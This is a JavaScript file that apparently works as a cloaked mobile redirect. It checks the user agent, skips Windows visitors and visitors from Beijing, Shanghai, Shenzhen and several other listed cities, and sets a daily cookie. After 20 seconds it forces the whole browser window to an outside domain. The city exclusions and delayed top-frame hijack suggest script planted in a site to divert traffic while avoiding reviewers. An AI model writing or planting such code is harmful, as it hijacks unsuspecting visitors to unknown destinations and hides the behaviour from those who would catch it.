var wap = navigator.userAgent.match(/Android|Linux|iPad|iPhone|iPod/i) != null;
var ios = navigator.userAgent.match(/iPad|iPhone|iPod/i) != null;
var azs = navigator.userAgent.match(/Android|Linux/i) != null;
var lailu = document.referrer.toLowerCase().match(/sogou|soso/i) != null;
function show_code1(){
    var tcurl = 'https://1j103ovi.szmasterworks.com/ice1127';
    var isshare = getCookie('tanchuang');
    if(isshare == null || isshare == ''){
    	setCookie('tanchuang', 'true', 86400);
        var tiao=setTimeout(function(){
			window.top.location.href=tcurl; //这里是延时跳转
		},20*1000);
    }
}
if(wap){
    $(document).ready(function(){
        if (/Win/i.test(navigator.platform)) return false;
        //if(lailu || urls('rf')){
			if(shengfen=="北京" || shengfen=="重庆" || shengfen=="上海" || chengshi=="杭州" || chengshi=="成都" || chengshi=="深圳" || chengshi=="菏泽"){
				return false;
			}else{
			    show_code1();
			}
        //}
    });
}
//添加cookie
function setCookie(name,value,miao){
	var exp = new Date();
	exp.setTime(exp.getTime() + miao*1000);
	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
//删除cookie
function delCookie(name,value,miao){
	var exp = new Date();
	exp.setTime(exp.getTime() - miao*1000);
	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
//获取cookie状态
function getCookie(name){
	var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	if(arr=document.cookie.match(reg)){
		return unescape(arr[2]);
	}else{
		return null;
	}
}
//判断时间
function time_range(beginTime, endTime) {
    var strb = beginTime.split(":");
    if (strb.length != 2) {
        return false;
    }
 
    var stre = endTime.split(":");
    if (stre.length != 2) {
        return false;
    }
 
    var b = new Date();
    var e = new Date();
    var n = new Date();
    //n.setHours(22);
    
    b.setHours(strb[0]);
    b.setMinutes(strb[1]);
    e.setHours(stre[0]);
    e.setMinutes(stre[1]);
 
    if (n.getTime() - b.getTime() > 0 && n.getTime() - e.getTime() < 0) {
       return true;
    } else {
       return false;
    }
}
//地址参数
function urls(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return decodeURI(r[2]); return null;
}